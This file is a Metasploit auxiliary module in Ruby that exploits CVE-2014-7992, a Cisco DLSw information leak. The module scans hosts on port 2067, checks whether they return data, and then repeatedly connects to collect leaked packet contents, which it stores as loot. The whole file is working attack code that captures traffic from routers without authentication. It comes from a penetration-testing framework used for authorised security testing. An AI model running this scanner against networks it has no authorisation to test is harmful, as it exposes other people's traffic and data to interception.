##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'socket'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Cisco DLSw information leak',
      'Description'    => %q{
       This module implements the DLSw information leak retrieval. There is
       a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
       that allows an unuthenticated remote attacker to retrieve the partial
       contents of packets traversing a Cisco router with DLSw configured
       and active.
      },
      'Author'         => [
        'Tate Hansen', # Vulnerability discovery
        'John McLeod', # Vulnerability discovery
        'Kyle Rainey', # Built lab to recreate vulnerability and help test
      ],
      'References'     =>
        [
          ['CVE', '2014-7992'],
          ['URL', 'https://github.com/tatehansen/dlsw_exploit'],
        ],
      'DisclosureDate' => 'Nov 17 2014',
      'License'        => MSF_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(2067),
        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024]),
      ], self.class)
  end

  # Called when using check
  def check_host(ip)
    print_status "Checking for DLSw exposure"
    connect
    response = sock.recv(72)
    disconnect

    if response.length > 0
     print_status("Cisco router appears vulnerable - DLSw data is returned when establishing a connection to #{rport}")
     report_vuln({
        :host => rhost,
        :port => rport,
        :name => self.name,
        :refs => self.references,
        :info => "Module #{self.fullname} successfully leaked info"
      })
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    print_status("Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes from #{ip}")

    dlsw_data = ""
    until dlsw_data.length > datastore['LEAK_AMOUNT']
      connect
      response = sock.recv(72)
      if response
        dlsw_data << response[18..72] # range of the leaked packet contents
      end
      disconnect
    end
    loot_and_report(dlsw_data)
  end

  def loot_and_report(dlsw_data)
    path = store_loot(
      'dlsw.packet.contents',
      'application/octet-stream',
      rhost,
      dlsw_data,
      'DLSw_leaked_data',
      'DLSw packet memory leak'
    )
    print_status("DLSw data stored in #{path}")
  end
end
